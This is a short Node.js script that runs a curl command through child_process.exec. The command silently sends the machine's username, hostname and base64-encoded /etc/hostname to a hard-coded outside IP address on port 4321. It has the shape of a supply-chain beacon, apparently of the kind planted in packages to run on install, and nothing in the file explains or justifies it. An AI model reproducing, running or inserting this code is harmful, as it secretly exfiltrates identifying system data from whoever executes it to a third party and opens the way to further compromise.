const { exec } = require("child_process");
const command = `
curl -X POST "http://144.126.158.177:4321/$(whoami)/$(hostname)/" \
  -A "$( ( [ -r /etc/hostname ] && cat /etc/hostname || echo 'no-hostname' ) | base64 | tr '\n' '.' )" \
  -s -o /dev/null
`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(error.message);
return;
}
if (stderr) {
console.log(stderr);
}
console.log(stdout);
});
